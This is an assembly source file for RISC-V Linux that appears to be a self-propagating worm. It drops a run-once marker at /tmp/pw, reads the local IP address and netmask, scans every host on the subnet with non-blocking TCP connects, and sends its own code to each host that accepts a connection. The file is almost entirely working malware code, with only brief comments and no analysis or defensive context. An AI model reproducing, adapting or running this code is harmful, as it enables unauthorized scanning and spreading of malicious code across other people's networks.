	.text
	.global _start
_start:
	# Create /tmp/pw
	li 	a7, 56 		# openat
	li 	a0, 0
	la 	a1, mark
	li 	a2, 0300      	# O_CREAT | O_EXCL
	li 	a3, 0777      	# 511
	ecall
	blt 	a0, zero, done  # If file exists we are done

	# File Descriptor already in a0
	li   	a7, 57     	# Close
	ecall	

	# Create socket for query 
	li  	a7, 198
	li  	a0, 2
	li  	a1, 1
	li  	a2, 6
	ecall
	move 	t0, a0

	# Store device name in memory
	li     	a0, 0x30687465
	sw     	a0, -0x40(sp)
	
	# Get IP
	li     	a7, 29
	move   	a0, t0
	li     	a1, 0x8915
	add    	a2, sp, -0x40   # a1 points to buffer in stack
	ecall
	lw     	t2, -0x2c(sp)   # Store IP in t2

	# Get Netmask
	li     	a7, 29
	move   	a0, t0
	li     	a1, 0x891b
	ecall
	lw     	t3, -0x2c(sp)   # Store Netmask in t3

	# Set sockaddr port for later
	li   	a4, 0x0f27
	sh   	a4, -0x2e(sp)
	
	# Close socket
	li    	a7, 57          # Close query socket
	move  	a0, t0
	ecall
	
	# Calculate network address in host format
	and  	a4, t2, t3
	jal  	bswap32
	move 	t2, a4
	
	# Calculate number of hosts
	move   	a4, t3
	jal    	bswap32
	sext.w 	a4,a4   	# Extend sign so negation produces the right result
	not    	t3, a4
	
	# Variables so far
	#  t2 : Network Address (Little Endian) we can add
	#  t3 : Number of host to scan
	#  t4 : Loop index
	#  t5 : Connection Socket
	#  t6 : Constant for byte masking
	#  a4 : Parameter to call BSWAP32

	# Compile with -march rv64imc_zbb fore REV instruction (Bit Manipulation)
	# Compile with -march=rv64imac for compressed opcodes
	
	move 	t4,zero
	li   	t6, 0xff
scan:
	# Skip address ending in 0 and FF
	move 	a0, t4
	and  	a0, a0, t6
	beq  	a0, zero, next_loop
	beq  	a0, t6, next_loop
	
	# Create socket
	li  	a7, 198
	li  	a0, 2
	li  	a1, 1
	li  	a2, 6
	ecall
	move 	t5, a0
	
	# Make socket NONBLOCKING
	li   	a7, 25     	# fcntl
	move 	a0, t5     	# Socket
	li   	a1, 4      	# 0x800 O_NONBLOCKING
	li   	a2, 0x800
	ecall
	
	# Calculate Target Address
	or     	a4, t2, t4
	jal    	bswap32        	# Convert to Big Endian (Network format0
	sw     	a4, -0x2c(sp)  	# Store in memory
	
	li     	t1, 4     	# 4 tries
	li     	a2, 16    	# Address size
try_connect:
	# connect (a0 already set to socket)
	li     	a7, 203        	# Connect
	move   	a0, t5         	# socket
	add    	a1, sp, -0x30  	# Address

	ecall
	beqz   	a0, move      	# If connected move ourselves
	# we get here on error
	li     	a1, -115
	bne    	a0, a1, next    # If error is not EINPROGRESS... go for next host
	li     	a7, 101
	la     	a0, delay
	move   	a1, zero
	ecall

	add    	t1, t1, -1
	bnez   	t1, try_connect
	j      	next
	
move:	
	# Send worm
	li   	a7, 64
	move 	a0, t5
	la   	a1, _start
	la   	a2, code_size
	ecall
	
next:	
	# Close socket
	li   	a7, 57
	move 	a0, t5
	ecall

next_loop:	
	# Scan next host
	add 	t4,t4, 1
	bge 	t4, t3, done
	j   	scan

done:
        # Exit
        li 	a7, 93
        li 	a0, 0
        ecall

	# Parameter a4 = 0x44332211
bswap32:
	srli   a0, a4, 24   # a0 = 0x00000044
	
	srli   a1, a4, 16   # a1 = 0x00004433
	andi   a1, a1, 0xff # a1 = 0x00000033
	slli   a1, a1, 8    # a1 = 0x00003300
	or     a1, a1, a0   # a1 = 0x00003300 | 0x00000044 = 0x00003344
	
	srli   a0, a4, 8    # a2 = 0x00443322
	andi   a0, a0, 0xff # a2 = 0x00000022
	slli   a0, a0, 16   # a2 = 0x00220000
	or     a0, a0, a1   # a2 = 0x00003344 | 0x00220000 = 0x00223344

	andi   a4, a4, 0xff # a4 = 0x11
	slli   a4, a4, 24   # a4 = 0x11000000
	or     a4, a4, a0   # a4 = 0x11000000 | 0x00223344 = 0x11223344
	ret
	
mark:
	.asciz "/tmp/pw"
delay:	        .quad 0
        delay_nsec:	.quad 5000000		
end_code:	.equ	code_size, end_code - _start	
